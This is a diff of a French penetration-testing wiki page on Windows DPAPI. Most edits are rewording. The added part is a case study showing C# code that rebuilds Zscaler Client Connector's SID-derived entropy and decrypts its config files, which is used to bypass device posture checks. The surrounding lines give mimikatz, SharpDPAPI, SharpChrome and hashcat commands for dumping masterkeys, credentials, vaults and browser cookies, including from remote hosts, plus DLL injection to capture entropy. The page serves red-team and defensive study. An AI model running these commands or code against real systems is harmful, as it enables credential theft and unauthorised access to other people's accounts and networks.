@@ -12,7 +12,7 @@ La manière la plus courante d'utiliser DPAPI est via les fonctions **`CryptProt
 
 De plus, ces fonctions acceptent également un **paramètre `entropy`** qui sera également utilisé lors du chiffrement et du déchiffrement, donc, pour déchiffrer quelque chose chiffré en utilisant ce paramètre, vous devez fournir la même valeur d'entropie qui a été utilisée lors du chiffrement.
 
-### Génération de clé des utilisateurs
+### Génération de clé utilisateur
 
 Le DPAPI génère une clé unique (appelée **`pre-key`**) pour chaque utilisateur en fonction de ses identifiants. Cette clé est dérivée du mot de passe de l'utilisateur et d'autres facteurs, et l'algorithme dépend du type d'utilisateur mais se termine par un SHA1. Par exemple, pour les utilisateurs de domaine, **cela dépend du hachage HTLM de l'utilisateur**.
 
@@ -21,7 +21,7 @@ C'est particulièrement intéressant car si un attaquant peut obtenir le hachage
 - **Déchiffrer toute donnée qui a été chiffrée en utilisant DPAPI** avec la clé de cet utilisateur sans avoir besoin de contacter une API
 - Essayer de **craquer le mot de passe** hors ligne en essayant de générer la clé DPAPI valide
 
-De plus, chaque fois qu'une donnée est chiffrée par un utilisateur utilisant DPAPI, une nouvelle **clé maître** est générée. Cette clé maître est celle réellement utilisée pour chiffrer les données. Chaque clé maître est fournie avec un **GUID** (Identifiant Unique Global) qui l'identifie.
+De plus, chaque fois qu'une donnée est chiffrée par un utilisateur utilisant DPAPI, une nouvelle **clé maître** est générée. Cette clé maître est celle réellement utilisée pour chiffrer les données. Chaque clé maître est accompagnée d'un **GUID** (Identifiant Unique Global) qui l'identifie.
 
 Les clés maîtres sont stockées dans le répertoire **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, où `{SID}` est l'identifiant de sécurité de cet utilisateur. La clé maître est stockée chiffrée par le **`pre-key`** de l'utilisateur et également par une **clé de sauvegarde de domaine** pour la récupération (donc la même clé est stockée chiffrée 2 fois par 2 mots de passe différents).
 
@@ -32,7 +32,7 @@ Les blobs chiffrés contiennent le **GUID de la clé maître** qui a été utili
 > [!TIP]
 > Les blobs chiffrés par DPAPI commencent par **`01 00 00 00`**
 
-Trouver les clés maîtres :
+Trouver des clés maîtres :
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -41,11 +41,11 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-Voici à quoi ressemble un ensemble de clés maîtresses d'un utilisateur :
+Voici à quoi ressemble un ensemble de Master Keys d'un utilisateur :
 
 ![](<../../images/image (1121).png>)
 
-### Génération de clés machine/système
+### Génération de clés Machine/Système
 
 C'est la clé utilisée par la machine pour chiffrer des données. Elle est basée sur le **DPAPI_SYSTEM LSA secret**, qui est une clé spéciale à laquelle seul l'utilisateur SYSTEM peut accéder. Cette clé est utilisée pour chiffrer des données qui doivent être accessibles par le système lui-même, telles que des identifiants au niveau de la machine ou des secrets à l'échelle du système.
 
@@ -120,7 +120,7 @@ mimikatz vault::list
 
 ### Trouver des données chiffrées DPAPI
 
-Les **fichiers protégés** des utilisateurs courants se trouvent dans :
+Les fichiers **protégés** courants des utilisateurs se trouvent dans :
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
@@ -162,7 +162,7 @@ SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect
 # Decrypt machine data
 SharpDPAPI.exe machinetriage
 ```
-- **Obtenez des informations d'identification** telles que les données chiffrées et le guidMasterKey.
+- **Obtenez des informations d'identification** comme les données chiffrées et le guidMasterKey.
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -174,7 +174,7 @@ pbData             : b8f619[...snip...]b493fe
 ```
 - **Accéder aux masterkeys** :
 
-Décrypter une masterkey d'un utilisateur en demandant la **clé de sauvegarde de domaine** en utilisant RPC :
+Décrypter une masterkey d'un utilisateur en demandant la **clé de sauvegarde de domaine** via RPC :
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -232,7 +232,7 @@ SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ---
 ### Gestion de l'entropie optionnelle ("Entropie tierce")
 
-Certaines applications passent une valeur d'**entropie** supplémentaire à `CryptProtectData`. Sans cette valeur, le blob ne peut pas être décrypté, même si la clé maître correcte est connue. Obtenir l'entropie est donc essentiel lors de la cible de crédentiels protégés de cette manière (par exemple, Microsoft Outlook, certains clients VPN).
+Certaines applications passent une valeur d'**entropie** supplémentaire à `CryptProtectData`. Sans cette valeur, le blob ne peut pas être décrypté, même si la clé maître correcte est connue. Obtenir l'entropie est donc essentiel lors de la cible de credentials protégés de cette manière (par exemple, Microsoft Outlook, certains clients VPN).
 
 [**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) est une DLL en mode utilisateur qui intercepte les fonctions DPAPI à l'intérieur du processus cible et enregistre de manière transparente toute entropie optionnelle qui est fournie. Exécuter EntropyCapture en mode **DLL-injection** contre des processus comme `outlook.exe` ou `vpnclient.exe` produira un fichier mappant chaque tampon d'entropie au processus appelant et au blob. L'entropie capturée peut ensuite être fournie à **SharpDPAPI** (`/entropy:`) ou **Mimikatz** (`/entropy:<file>`) afin de déchiffrer les données.
 ```powershell
@@ -244,7 +244,7 @@ SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
 ### Cracking des masterkeys hors ligne (Hashcat & DPAPISnoop)
 
-Microsoft a introduit un format de masterkey **context 3** à partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (décembre 2023) a ajouté des modes de hachage **22100** (DPAPI masterkey v1 context), **22101** (context 1) et **22102** (context 3) permettant le craquage accéléré par GPU des mots de passe utilisateurs directement à partir du fichier masterkey. Les attaquants peuvent donc effectuer des attaques par liste de mots ou par force brute sans interagir avec le système cible.
+Microsoft a introduit un format de masterkey **contexte 3** à partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (décembre 2023) a ajouté des modes de hachage **22100** (DPAPI masterkey v1 contexte), **22101** (contexte 1) et **22102** (contexte 3) permettant le craquage accéléré par GPU des mots de passe utilisateurs directement à partir du fichier masterkey. Les attaquants peuvent donc effectuer des attaques par liste de mots ou par force brute sans interagir avec le système cible.
 
 `DPAPISnoop` (2024) automatise le processus :
 ```bash
@@ -254,10 +254,9 @@ hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
 L'outil peut également analyser les blobs de Credential et de Vault, les déchiffrer avec des clés craquées et exporter des mots de passe en clair.
 
-
 ### Accéder aux données d'une autre machine
 
-Dans **SharpDPAPI et SharpChrome**, vous pouvez indiquer l'option **`/server:HOST`** pour accéder aux données d'une machine distante. Bien sûr, vous devez être en mesure d'accéder à cette machine et dans l'exemple suivant, il est supposé que **la clé de chiffrement de sauvegarde de domaine est connue** :
+Dans **SharpDPAPI et SharpChrome**, vous pouvez indiquer l'option **`/server:HOST`** pour accéder aux données d'une machine distante. Bien sûr, vous devez pouvoir accéder à cette machine et dans l'exemple suivant, il est supposé que **la clé de chiffrement de sauvegarde de domaine est connue** :
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
@@ -292,7 +291,7 @@ Avec la liste des ordinateurs extraits de LDAP, vous pouvez trouver chaque sous-
 - Surtout depuis un partage réseau comme **C$** ou **ADMIN$**.
 - Utilisation de **Mimikatz**, **SharpDPAPI** ou d'outils similaires pour accéder à la mémoire LSASS ou extraire des masterkeys.
 - Événement **4662** : *Une opération a été effectuée sur un objet* – peut être corrélé avec l'accès à l'objet **`BCKUPKEY`**.
-- Événement **4673/4674** lorsqu'un processus demande *SeTrustedCredManAccessPrivilege* (Gestionnaire d'identifiants)
+- Événements **4673/4674** lorsqu'un processus demande *SeTrustedCredManAccessPrivilege* (Gestionnaire d'identifiants)
 
 ---
 ### Vulnérabilités 2023-2025 et changements dans l'écosystème
@@ -301,7 +300,43 @@ Avec la liste des ordinateurs extraits de LDAP, vous pouvez trouver chaque sous-
 * **Chiffrement des cookies "App-Bound" de Chrome 127** (juillet 2024) a remplacé la protection DPAPI uniquement héritée par une clé supplémentaire stockée sous le **Gestionnaire d'identifiants** de l'utilisateur. Le déchiffrement hors ligne des cookies nécessite désormais à la fois la masterkey DPAPI et la **clé app-bound enveloppée GCM**. SharpChrome v2.3 et DonPAPI 2.x peuvent récupérer la clé supplémentaire lorsqu'ils sont exécutés avec le contexte utilisateur.
 
 
+### Étude de cas : Zscaler Client Connector – Entropie personnalisée dérivée de SID
+
+Zscaler Client Connector stocke plusieurs fichiers de configuration sous `C:\ProgramData\Zscaler` (par exemple, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Chaque fichier est chiffré avec **DPAPI (portée machine)** mais le fournisseur fournit une **entropie personnalisée** qui est *calculée à l'exécution* au lieu d'être stockée sur le disque.
+
+L'entropie est reconstruite à partir de deux éléments :
+
+1. Un secret codé en dur intégré dans `ZSACredentialProvider.dll`.
+2. Le **SID** du compte Windows auquel appartient la configuration.
+
+L'algorithme implémenté par la DLL est équivalent à :
+```csharp
+byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
+byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
+
+// XOR the two buffers byte-by-byte
+byte[] tmp = new byte[secret.Length];
+for (int i = 0; i < secret.Length; i++)
+tmp[i] = (byte)(sid[i] ^ secret[i]);
+
+// Split in half and XOR both halves together to create the final entropy buffer
+byte[] entropy = new byte[tmp.Length / 2];
+for (int i = 0; i < entropy.Length; i++)
+entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
+```
+Parce que le secret est intégré dans une DLL qui peut être lue depuis le disque, **tout attaquant local avec des droits SYSTEM peut régénérer l'entropie pour tout SID** et déchiffrer les blobs hors ligne :
+```csharp
+byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
+byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
+Console.WriteLine(Encoding.UTF8.GetString(clear));
+```
+Le déchiffrement produit la configuration JSON complète, y compris chaque **vérification de posture de l'appareil** et sa valeur attendue – des informations très précieuses lors des tentatives de contournement côté client.
+
+> ASTUCE : les autres artefacts chiffrés (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sont protégés par DPAPI **sans** entropie (`16` octets nuls). Ils peuvent donc être déchiffrés directement avec `ProtectedData.Unprotect` une fois les privilèges SYSTEM obtenus.
+
 ## Références
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
